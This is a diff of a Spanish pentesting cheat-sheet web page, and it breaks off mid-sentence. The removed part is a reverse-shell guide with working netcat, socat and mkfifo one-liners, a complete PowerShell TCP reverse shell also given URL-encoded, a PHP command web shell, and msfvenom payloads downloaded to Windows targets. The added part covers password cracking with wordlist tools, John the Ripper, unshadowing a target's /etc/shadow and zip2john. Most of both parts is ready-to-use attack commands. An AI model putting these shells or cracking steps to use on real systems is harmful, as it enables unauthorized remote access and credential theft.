@@ -1,9 +1,8 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title class="fab fa-linux">HackSheet Bl3Ak</title>
     <link rel="stylesheet" href="/css/prism.css">
@@ -11,11 +10,8 @@
     <link href="/css/estilos.css" rel="stylesheet">
     <link href="/css/button.css" rel="stylesheet">
     <link href="/css/linux.css" rel="stylesheet">
-
-
     <script type="module" src="/cmp/mi-footer.js"></script>
     <script src="https://kit.fontawesome.com/f67adc3b08.js" crossorigin="anonymous"></script>
-
 </head>
 
 <body>
@@ -46,611 +42,377 @@
 
 
     <div class="main">
-        <img class="linux" src="/images/shell.png" alt="Reverse Shell">
-        <h1> Reverse shells</h1>
+        <img class="linux" src="/images/bash.png" alt="logo Bash">
+        <h1> Linea de comandos Shell</h1>
         <ul>
-            <li><span class="comando1">Tipos de reverse shell </span>
 
+            <br>
+            <li><span class="comando2">Variables de entorno.</span>
+                <pre><code class="language-bash line-numbers"data-start="1"
+                            >env</code></pre>
+            </li>
+            <li><span class="comando2">Si no s queremos referir a una variables tenemos que poner un $ antes.</span>
+                <pre><code class="language-bash line-numbers"data-start="1"
+                            >$&lbrack;variable&rbrack;</code></pre>
+            </li>
+            <li><span class="comando2">Ruta de variables de entorno.</span>
+                <pre><code class="language-bash line-numbers"data-start="1"
+                            >echo $PATH</code></pre>
+                <span class="comando2">Contiene información sobre dónde debe buscar bash para ejecutar archivos cuando se introduce un comando en la ventana de bash.</span>
+                <pre><code class="language-bash line-numbers"data-start="1"
+                            >&lbrack;location&rbrack;:&lbrack;location&rbrack;:&lbrack;location&rbrack;:…:&lbrack;location&rbrack;</code></pre>
+
+
+            </li>
+
+            <br>
+            <br>
+            <span class="pasos">Identificador</span>
+
+            <li><span class="comando2">Identifica el tipo de hash que es, por medio de bash.</span>
                 <ol>
-                    <li><span class="comando2">Netcat</span>
-             la navaja suiza de la redes.</li>
-                    <li><span class="comando2">Socat</span>
-             la navaja suiza de la redes con asteroides.</li>
-                    <li><span class="comando2">auxiliary/multi/handler</span>
-             modulo de metasploit.</li>
-                    <li><span class="comando2">/usr/share/webshells</span>
-             WebShells de kali linux.</li>
-                    <li><span class="comando2">Pentestmonkey</span>
-            
-                        <a class="enlace" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
-                            target="_blank"><span class="comando1"></span>
-                            Link de consulta</a>
-                    </li>
-
-                    <li><span class="comando2">Reverse Shell Cheat Shell</span>
-            
-                        <a class="enlace"
-                            href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"
-                            target="_blank"><span class="comando1"></span>
-                            Link de consulta</a>
-                    </li>
-                    <li>
-                        <span class="comando2">Repositorio Reverse Shell</span>
-            <a class="enlace"
-                            href="https://github.com/danielmiessler/SecLists" target="_blank">
-                            <span class="comando1"></span>
-                            Link de consulta
-                        </a>
-                    </li>
-
-
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                    >hash-identifier &lbrack;hash&rbrack;</code></pre>
                 </ol>
             </li>
 
-            <br>
-            <li><span class="comando1">Puertos recomendables</span>
-     <span class="comando4">80, 53 ó 443   </span>
+            <li><span class="comando2">Identifica el tipo de hash que es, por medio de python.</span>
                 <ol>
-                    <li><span class="comando5">Estos puertos el listener debe ejecutarse con sudo, con esto puede que
-                            supere las reglas del firewall.</span></li>
+                    <pre><code class="language-python line-numbers"data-start="1"
+                    >python3 hash-id.py &lbrack;hash&rbrack;</code></pre>
                 </ol>
             </li>
+            <li><span class="comando2">Identifica el tipo de hash que es, por medio de haiti.</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                    >haiti &lbrack;hash&rbrack;</code></pre>
+                </ol>
             </li>
 
-            <br>
-            <br>
 
-            <div class="pasos">Bind y Reverse Netcat shells</div>
-            <li><span class="comando1">Reverse shell</span>
-     La victima de conecta al atacante.
+            <span class="pasos">Lyricpass</span>
+            <li> <a class="enlace" href="https://github.com/initstring/lyricpass.git"
+                    target="_blank"><span>lyricpass</span></a>:
+                Crear una lista de palabras basadas en letras de artistas.
+            </li>
+            <li><span class="comando2">Buscar lista de palabras en la web.</span>
                 <ol>
-                    <li><span class="comando2">Creamos el listener en la maquina atacante</span>
-            
-                        <pre><code class="language-bash line-numbers"data-start="1"
-                                >sudo nc -lvnp &lbrack;PORT&rbrack;</code></pre>
-
-                        </span>
-                    </li>
-                    <li><span class="comando2">Crear una reverse shell en el target </span>
-            
-                        <pre><code class="language-bash line-numbers"data-start="1"
-                            >nc &lbrack;TURN0&rbrack; &lbrack;PORT&rbrack; -e /bin/bash</code></pre>
-                        <ol>
-                            <span class="comando3">Puede ser tambien un .exe para Windows</span>
-                
-                            <span class="comando4">"cmd.exe" </span>
-                        </ol>
-                    </li>
+                    <pre><code class="language-python line-numbers"data-start="1"
+                    >./lyricpass.py -a &lbrack;name of the artist &rbrack; -i &lbrack;out.txt&rbrack;</code></pre>
                 </ol>
                 <ol>
-                    <li><span class="comando5">Opcion 2</span></li>
-                    <li><span class="comando2">Creamos el listener en la maquina atacante</span>
-            
-                        <pre><code class="language-bash line-numbers"data-start="1"
-                            >sudo nc -lvnp &lbrack;PORT&rbrack;</code></pre>
-
-                    </li>
-                    <li><span class="comando2">Crear una reverse shell en el target </span>
-            
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
-                            > mkfifo /tmp/f; nc &lbrack;TARGET&rbrack; &lbrack;PORT&rbrack; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&1; rm /tmp/f</code></pre>
-                    </li>
+                    <pre><code class="language-python line-numbers"data-start="1"
+                    >./lyricpass.py -a adele -i out.txt</code></pre>
                 </ol>
             </li>
-            <br>
 
-            <li><span class="comando1">Bind shell</span>
-     la victima deja un puerto en escucha para que el atacante se
-                conecte.
-
+            <span class="pasos">Pnwgen</span>
+            <li> <a class="enlace" href="git clone https://github.com/toxydose/pnwgen.git"
+                    target="_blank"><span>lyricpass</span></a>:
+                Crear una lista de palabras basadas en numeros telefonicos.
+            </li>
+            <li><span class="comando2">Crear lista de palabras.</span>
                 <ol>
-                    <li><span class="comando2">Crear una reverse shell en el target </span>
-                        <pre><code class="language-powershell line-numbers"data-start="1"
-                            >nc -lvnp &lbrack;PORT&rbrack; -e "cmd.exe"</code></pre>
-                    </li>
-                    <li><span class="comando2">Creamos el listener en la maquina atacante</span>
-                        <pre><code class="language-bash line-numbers"data-start="1"
-                                >nc &lbrack;LOCAL IP&rbrack; &lbrack;PORT&rbrack; </code></pre>
-
-                        <ol>
-                            <span class="comando3">Puede ser tambien un .exe para Windows</span>
-                            <span class="comando4">"cmd.exe" </span>
-                        </ol>
-                    </li>
-
-
+                    <pre><code class="language-python line-numbers"data-start="1"
+                    >python3 pnwgen.py &lbrack;prefix&rbrack; &lbrack;suffix&rbrack; &lbrack;length&rbrack;</code></pre>
                 </ol>
-
                 <ol>
-                    <li><span class="comando5">Opcion 2</span></li>
-
-                    <li><span class="comando2">Crearemos una bind shell en el target</span>
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >mkfifo /tmp/f; nc -lvnp &lbrack;PORT&rbrack; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f </code></pre>
-
-                    </li>
-                    <li><span class="comando2">En nuestra maquina atacante </span>
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >nc &lbrack;TARGET&rbrack; &lbrack;PORT&rbrack; </code></pre>
-                    </li>
-                    <br>
-                    <img class="center" src="/images/powershell.png" />
-                    <div class="titulo">Powershell</div>
-                    <li><span class="comando2">Cuando la maquina es Windows</span>
-
-                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;"data-start="1"
-                            style="white-space:pre-wrap;">powershell -c "$client = New-Object System.Net.Sockets.TCPClient('&lt;ip&gt;',&lt;port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre>
-
-                    </li>
+                    <pre><code class="language-python line-numbers"data-start="1"
+                    >./pnwgen.py +1721 "" 7</code></pre>
                 </ol>
             </li>
-
-
-            <br>
-            <br>
-            <div class="pasos">Bind y Reverse Socat shells</div>
-            <li><span class="comando1">Reverse shell</span>
+            <span class="pasos">Wordlistctl</span>
+            <li><span class="comando2">Buscar lista de palabras en la web.</span>
                 <ol>
-                    <li><span class="comando2">Creamos el listener en la maquina atacante</span>
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >socat TCP-L:&lbrack;PORT&rbrack; -</code></pre>
-
-                    </li>
-                    <br>
-                    <img class="center" src="/images/tux.png" />
-                    <div class="titulo">Linux</div>
-                    <li><span class="comando2">Crear una reverse shell en el target en
-                            Linux</span>
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >socat TCP:&lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack; EXEC:"bash -li"</code></pre>
-
-                    </li>
-                    <br>
-                    <img class="center" src="/images/powershell.png" />
-                    <div class="titulo">Powershell</div>
-                    <li><span class="comando2">Crear una reverse shell en el target
-                            de Windows </span>
-                
-                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >socat TCP:&lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack; EXEC:powershell.exe,pipes</code></pre>
-
-                    </li>
+                    <pre><code class="language-python line-numbers"data-start="1"
+                    >python3 ./wordlistctl.py search &lbrack;name of the wordlist&rbrack;</code></pre>
                 </ol>
             </li>
-
-            <br>
-            <li><span class="comando1">Bind shell</span>
-
-                <ol><img class="center" src="/images/tux.png" />
-                    <div class="titulo">Linux</div>
-                    <li><span class="comando2">Crear una reverse shell en el target en
-                            linux </span>
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >socat TCP-L:&lbrack;PORT&rbrack; EXEC:"bash -li"</code></pre>
-                    </li>
-                    <br>
-                    <img class="center" src="/images/powershell.png" />
-                    <div class="titulo">Powershell</div>
-                    <li><span class="comando2">Crear una reverse shell en el target
-                            en windows </span>
-                
-                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >socat TCP-L:&lbrack;PORT&rbrack; EXEC:powershell.exe,pipes</code></pre>
-
-                    </li>
-
-                    <li><span class="comando2">Creamos el listener en la maquina atacante</span>
-            
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >socat TCP:&lbrack;TARGET&rbrack;:&lbrack;PORT&rbrack; -</code></pre>
-
-                    </li>
-
-                    <li><span class="comando5">Cuando socat no viene instalado</span></li>
-
-                    <li> <span class="comando2">Por defecto Socat no viene instalado, pero podemos cargar un
-                            precompilado
-                            socat binary</span>
-                 <span class="comando4"></span>
-                        <a class="enlace"
-                            href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true"
-                            target="_blank"><span class="comando1"></span>
-                            Link de descarga</span></a>
-                    </li>
-                    <li><span class="comando2">Montar un web server, se tiene que montar donde esta guardado el
-                            socat</span>
-                
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >sudo python3 -m http.server 80</code></pre>
-                    </li>
-                    <li><span class="comando2">Montar un web server en la maquina target</span>
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
-                        >sudo python –m SimpleHTTPServer</code></pre>
-
-                    </li>
-
-
-
-
-                    <li><span class="comando2">Ir a windows y abrir Powershell</span>
-            
-                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >Invoke-WebRequest -uri http://&lbrack;TURN0&rbrack;socat.exe -outfile C:\\Windows\temp\socat.exe</code></pre>
-                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"> Invoke-WebRequest -uri http://10.10.10.123:80/socat -outfile C:\\Windows\temp\socat.exe</code></pre>
-                    </li>
-                    <li><span class="comando2">Comprobamos que se subio el archivo</span></li>
-                    <li><span class="comando2">Ahora ponemos un listener con socat</span>
-            
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >socat TCP-L:&lbrack;PORT&rbrack; -</code></pre>
-                    <li><span class="comando2">Ahora nos vamo a windows y ejecuatamos el comando en powershell</span>
-            
-
-                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >socat TCP:&lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack; EXEC:powershell.exe,pipes</code></pre>
-                    </li>
-                </ol>
-            </li>
-
-            <br>
-            <br>
-            <img class="center" src="/images/webpage.png" alt="web">
-            <div class="pasos">WebShell</div>
-
-            <li><span class="comando1">Reverse shell</span>
+            <li><span class="comando2">Buscar lista de palabras de manera local.</span>
                 <ol>
-                    <li><span class="comando2">Podemos generar un archivo por medio de Pentestmonkey</span></li>
-                    <li><span class="comando2">Creamos un archivo llamado php-reverse-shell.php</span>
-            
-                        <pre><code class="language-php line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >&lt;?php echo "&lt;pre&gt;" . shell_exec($_GET["cmd"]) . "&lt;/pre&gt;";?&gt;</code></pre>
-
-                    </li>
-                    <li><span class="comando2">Subimos el archivo </span></li>
-                    <li><span class="comando2">Al final de la URL le agregamos</span>
-            
-                        <pre><code class="language-html line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >?cmd=</code></pre>
-                    </li>
-
-                    <li><span class="comando2">Probamos con los siguientes comandos, para comprobar que tenemos
-                            acceso</span>
-                
-                        <pre><code class="language-xml line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >ipconfig, whoami, hostname, arch</code></pre>
-
-                    </li>
-                    <li><span class="comando2">Si en caso que el php se ejecuta en un Windows Server, necesitamos correr
-                            un reverse shell en powershell </span></li>
-                    <li><span class="comando2">Modificaresmos el IP y el PORT de la URL Encoded Power </span>
-            
-                        <pre><code class="language-html line-numbers" style="white-space:pre-wrap;">powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27&lt;IP&gt;%27%2C&lt;PORT&gt;%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22</code></pre>
-                    </li>
-                    <li><span class="comando2">Ponemos un listener en escucha</span>
-            
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >nc –lvnp</code></pre>
-
-                    </li>
+                    <pre><code class="language-python line-numbers"data-start="1"
+                    >python3 ./wordlistctl.py search -l &lbrack;name of the wordlist&rbrack;</code></pre>
                 </ol>
-
             </li>
+            <li><span class="comando2">Descargar y descomprimir lista de palabras.</span>
+                <ol>
+                    <pre><code class="language-python line-numbers"data-start="1"
+                    >python3./wordlistctl.py fetch -l &lbrack;"name of the wordlist"&rbrack; -d fetch_term</code></pre>
+                </ol>
+            </li>
+
+            <span class="pasos">ttpassgen</span>
+            <li> <a class="enlace" href="https://pypi.org/project/ttpassgen/" target="_blank"><span>ttpassgen</span></a>
+            </li>
+            <li><span class="comando2">Crear una lista de palabras.</span>
+                <ol>
+                    <pre><code class="language-python line-numbers"data-start="1"
+                    >python3 ttpassgen.py -r &lbrack;rules&rbrack; &lbrack;out.txt&rbrack;</code></pre>
+                </ol>
+                <ol>
+                    <pre><code class="language-python line-numbers"data-start="1"
+                    >python3 ttpassgen.py -r [?l]{2}[12345]{4}[?s] symbols.txt</code></pre>
+                </ol>
+            </li>
+            <li><span class="comando2">Combinar listas de palabras.</span>
+                <ol>
+                    <pre><code class="language-python line-numbers"data-start="1"
+                    >python3 ttpassgen.py --dictlist &lbrack;'file1.txt,file2.txt'&rbrack; --rule '$0$1' &lbrack;out.txt&rbrack;</code></pre>
+                </ol>
+                <ol>
+                    <pre><code class="language-python line-numbers"data-start="1"
+                    >python3 ttpassgen.py --dictlist 'file1.txt,file2.txt' --rule '$0$1' combination.txt</code></pre>
+                </ol>
+            </li>
+            <span class="pasos">Mentalist</span>
+            <li> <a class="enlace" href="https://github.com/sc0tfree/mentalist"
+                    target="_blank"><span>mentalist</span></a>:
+                Crear una lista de palabras por medio de mutacion.
+            </li>
+
+
             <br>
             <br>
-            <img class="center" src="/images/ninja.png" alt="ninja">
-            <div class="pasos">Msfvenom</div>
-            <li><span class="comando1">Staged Shell</span>
+            <span class="pasos">John The Riper</span>
+            <li> <a class="enlace" href="https://www.openwall.com/john/doc/RULES.shtml"
+                    target="_blank"><span>Rules</span></a>:
+                Lista de reglas.</li>
+            <li> <a class="enlace" href="https://www.reydes.com/archivos/juan_the_ripper_reydes.html
+                    " target="_blank"><span>Rules</span></a>:
+                Lista de reglas.</li>
+            <li><span class="comando1">John</span>
                 <ol>
-                    <li style="width: 95%;"><span class="comando2">Staged</span>
-            
-
-                        se envían en dos partes. La primera parte se llama stager.
-                        Este es un fragmento de código que se
-                        ejecuta directamente en el servidos.
-                        Se conecta de nuevo a un oyente en espera, pero en realidad
-                        no contine ningún código de Shell inverso por si mismo. En su lugar, se conecta al oyente y
-                        usa
-                        la conexión para cargar el payload real, ejecutándola directamente y evitando que toque el
-                        disco
-                        donde podría ser atrapado por las soluciones de antivirus tradicionales. Por lo tanto, la
-                        carga
-                        útil se divide en dos partes: una pequeña etapa inicial, luego el código de Shell inverso
-                        más
-                        voluminoso que de descarga cuando se activa la etapa. El payload por etapas requieren un
-                        oyente
-                        inicial especial, generalmente el manejador/multiple Metasploit, que se tratara en la
-                        siguiente
-                        tarea.
+                    <li><span class="comando2">instalacion de john the riper.</span></li>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                        >sudo apt install john</code></pre>
+                    <li><span class="comando2">diccionario de palabras.</span></li>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                    >cd /usr/share/wordlists</code></pre>
+                </ol>
+            </li>
 
 
 
+            <li><span class="comando1">Encontrar el formato del hashes</span>
+                <ol>
+
+                    <pre><code class="language-bash line-numbers" data-start="1"
+                        >john --list=formats | grep -iF "&lbrack;format&rbrack;"</code></pre>
+                    <pre><code class="language-bash line-numbers" data-start="1"
+                        >john --list=formats | grep -iF "MD5"</code></pre>
+
+                </ol>
+
+            </li>
+            <li><span class="comando1">Mostrar el formato del hashes</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers" data-start="1"
+                        >john --show --format=[format] &lbrack;file&rbrack;</code></pre>
+                </ol>
+
+            </li>
+            <li><span class="comando1">Editar las reglas</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers" data-start="1"
+                        >sudo nano /etc/john/john.conf</code></pre>
+                </ol>
+                <ol>
+                    <pre><code class="language-bash line-numbers" data-start="1"
+                        >[List.Rules:advice1]
+c$1$2$3$4$[$%&*-_+=#@~!]</code></pre>
+                </ol>
+            <li><span class="comando1">Cracking Hashes con reglas</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                        >john --format=raw-&lbrack;format&rbrack; --wordlist=/usr/share/wordlists/rockyou.txt --rules=&lbrack;rules&rbrack; &lbrack;file&rbrack;</code></pre>
+                </ol>
+
+            </li>
+            </li>
+            <li><span class="comando1">Cracking Hashes</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                    >john --wordlist=/usr/share/wordlists/rockyou.txt &lbrack;file&rbrack;</code></pre>
+
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                    >john --format=raw-&lbrack;format&rbrack; --wordlist=/usr/share/wordlists/rockyou.txt &lbrack;file&rbrack;</code></pre>
+                </ol>
+            </li>
+            <br>
+            <li><span class="comando1">Cracking Windows Authentication Hashes </span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                        >john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt &lbrack;file&rbrack;</code></pre>
+                </ol>
+            </li>
+
+            <br>
+            <li><span class="comando1">Cracking /etc/shadow Hashes</span>
+                <ol>
+                    <li><span class="comando3">unshadow</span>: comando
                     </li>
-
-                    <li><span class="comando2">Buscamos primero la shell</span>
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >msfvenom --list payloads | grep “&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;”</code></pre>
-
-                        <br>
-                        <img class="center" src="/images/powershell.png" />
-                        <div class="titulo">Powershell</div>
-
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                    >msfvenom --list payloads | grep “windows/x64/meterpreter/reverse_tcp” </code></pre>
-
-                        <img class="center" src="/images/tux.png" />
-                        <div class="titulo">Linux</div>
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                    >msfvenom --list payloads | grep “linux/x86/meterpreter_reverse_tcp" </code></pre>
-
-                </ol>
-            </li>
-            <li><span class="comando2">Configuramos la shell</span>
+                    <li><span class="comando3">[path to passwd]</span>: el archivo contiene la copia del archivo
+                        /etc/passwd que has tomado de la maquina objetivo.
+                    </li>
+                    <li><span class="comando3">[path to shadow]</span>: el archivo contiene la copia del archivo
+                        /etc/shadow que tu hash tomado de la maquina objetivo.</li>
 
 
-                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
-                                >msfvenom -p &lbrack;PAYLOAD&rbrack; &lbrack;OPTIONS&rbrack;</code></pre>
+                    <li><span class="comando3">File 1 local_passwd contiene</span>: root:x:0:0::/root:/bin/bash</li>
 
+                    <li><span class="comando3">File 2 local_shadow contiene</span>:
+                        root:$6$2nwjN454g.dv4HN/$m9Z/ r2xVfweYVkrr.v5Ft8Ws3/
+                        YYksfNwq96UL1FX0OJjY1L6l.DS3KEVsZ9rOVLB/ ldTeEL/OIhJZ4GMFMGA0:
+                        18576::::::
+                    </li>
             </li>
 
-            <li><span class="comando2">Generar una reverse shell:</span>
+            <pre><code class="language-bash line-numbers"data-start="1"
+                        >unshadow local_passwd local_shadow &gt; unshadowed.txt</code></pre>
 
-                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                    >msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lbrack;TURN0&rbrack; LPORT=&lbrack;LISTE-PORT&rbrack;</code></pre>
+            <pre><code class="language-bash line-numbers"data-start="1"
+                            >john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt</code></pre>
 
-
-                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.10.123 LPORT=443</code></pre>
-            </li>
-            <li><span class="comando2">Subimos el archivo mediante WebServer</span>
-
-                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                    >sudo python3 -m http.server 80</code></pre>
-            </li>
-            <li> <span class="comando2"> Abrimos PowerShell en la maquina objetivo y descargamos la shell</span>
-                <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                    >Invoke-WebRequest -uri http://&lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack;/&lt;reverse-file&gt; -outfile C:\\Windows\temp\shell.exe</code></pre>
-
-
-                <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >Invoke-WebRequest -uri http://10.10.10.123:80/shell.exe -outfile C:\\Windows\temp\shell.exe</code></pre>
-            </li>
-
-            <li><span class="comando2">Abrir metasploit</span>
-
-                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >msfconsole -q</code></pre>
-                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >use multi/handler</code></pre>
-            <li><span class="comando3">Configuramos el PAYLOAD, LHOST Y LPORT</span></li>
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >set PAYLOAD &lbrack;PAYLOAD&rbrack;</code></pre>
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >set LHOST &lbrack;TURN0&rbrack;</code></pre>
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >set LPORT &lbrack;LISTEN-PORT&rbrack;</code></pre>
-            <li><span class="comando3">Ejecutamos</span></li>
-            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >exploit -j</code></pre>
-
-            </li>
-            <li><span class="comando2">Nos vamos a Windows y nos metemos a la carpeta donde se almaceno la
-                    shell.exe</span>
-                <ol>
-                    <li><span class="comando3">Damos doble click al ejecutable</span></li>
-                </ol>
-            </li>
-            <li><span class="comando2">En la consola de metasploit vemos que se cargó correctamente</span></li>
-            <li><span class="comando2">Nos dice que la session se cargo exitosamenr</span></li>
-            <li><span class="comando2">Cargamos la session</span>
-                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >sessions &lbrack;SESSION NUM&rbrack;</code></pre>
-            <li><span class="comando3">Entramos a la consola de Windows</span></li>
-            </li>
 
             </ol>
             </li>
 
             <br>
-            <br>
-            <li><span class="comando1">Stagless Shell</span>
+            <li><span class="comando1">Cracking Passwprd Protected Zip Files</span>
                 <ol>
-                    <li style="width: 50%;"><span class="comando2">Stageless</span>
-            Son los más comunes, son
-                        completamente autónomos en
-                        el sentido de que hay una pieza de código que, cuando se ejecuta, envía un Shell inmediatamente
-                        al oyente que espera.
-
-
-
-                    </li>
-                    <li><span class="comando2">Configuramos la shell</span>
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >msfvenom -p &lbrack;PAYLOAD&rbrack; &lbrack;OPTIONS&rbrack; </code></pre>
-
-                    </li>
-                    <li><span class="comando2">Generar una reverse shell:</span>
-
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                    >msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=&lbrack;TURN0&rbrack; LPORT=&lbrack;LISTEN-PORT&rbrack;</code></pre>
-
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                        >msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=10.10.10.123 LPORT=443</code></pre>
-
-                    </li>
-
-                    <li><span class="comando2">Subimos el archivo mediante WebServer</span>
-
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >sudo python3 -m http.server 80</code></pre>
-                    </li>
-                    <li><span class="comando2"> Abrimos PowerShell en la maquina objetivo y descargamos la shell</span>
-                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >Invoke-WebRequest -uri http://&lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack;/&lbrack;REVERSE-FILE&rbrack; -outfile C:\\Windows\temp\shell.exe</code></pre>
-
-                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                    >Invoke-WebRequest -uri http://10.10.10.123:80/shell.exe -outfile C:\\Windows\temp\shell.exe</code></pre>
-
-
-
-                    </li>
-
-                    <li><span class="comando2">Habilitamos el listener en nuestra maquina atacante</span>
-                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >nc -lvp &lbrack;PORT&rbrack; </code></pre>
-
-                    </li>
-                    <li><span class="comando2">Nos vamos a Windows y nos metemos a la carpeta donde se almaceno la
-                            shell.exe</span>
-                        <ol>
-                            <li><span class="comando3">Damos doble click al ejecutable</span></li>
-                            <li><span class="comando3">Entramos a la consola de Windows</span></li>
-                        </ol>
-                    </li>
-                    <li><span class="comando5">Es recomendable usuar rlwrap para poder estabilizar la shell en
-                            windows</span></li>
+                    <li><span class="comando3">convertinermos el archivo zip a uno que John the Riper lo pueda
+                            reconocer</span></li>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                            >zip2john &lbrack;zip file&rbrack;  > &lbrack;output file&rbrack;</code></pre>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                            >john --wordlist=/usr/share/wordlists/rockyou.txt &lbrack;file&rbrack;</code></pre>
                 </ol>
-
             </li>
 
-
             <br>
-            <br>
-            <li><span class="comando1">rlwrap</span>
-     pasos para generar una shell, nos da acceso al
-                historial, el
-                autocompletado de pestañas y teclas de flecha inmediatamente despues de recibir un shell, este tipo de
